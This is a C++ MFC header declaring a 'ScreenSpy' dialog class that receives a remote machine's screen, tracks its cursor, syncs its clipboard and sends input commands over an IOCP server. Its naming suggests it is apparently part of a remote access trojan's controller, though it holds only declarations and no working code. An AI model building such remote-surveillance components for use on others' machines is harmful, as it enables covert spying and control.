#pragma once

#include "../common/CursorInfo.h"
// CScreenSpyDlg 对话框

class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);    // 标准构造函数
	virtual ~CScreenSpyDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SCREENSPY };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()

private:
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsFirst;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	MINMAXINFO m_MMI;
	bool m_bIsCtrl;
	UINT m_nCount;
	BYTE	m_bCursorIndex;
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;

	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	bool m_bIsTraceCursor;
	CCursorInfo	m_CursorInfo;
	int	m_nBitCount;

public:
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
private:
	void InitMMI();
	void SendNext();
public:
	afx_msg void OnGetMinMaxInfo(MINMAXINFO* lpMMI);
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnPaint();
private:
	void DrawTipString(CString str);
public:
	void OnReceiveComplete();
private:
	void DrawFirstScreen();
	void DrawNextScreenRect();
	void DrawNextScreenDiff();
	void ResetScreen();
	void UpdateLocalClipboard(char* buf, int len);
public:
	void OnReceive();
private:
	void SendCommand(MSG* pMsg);
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
};
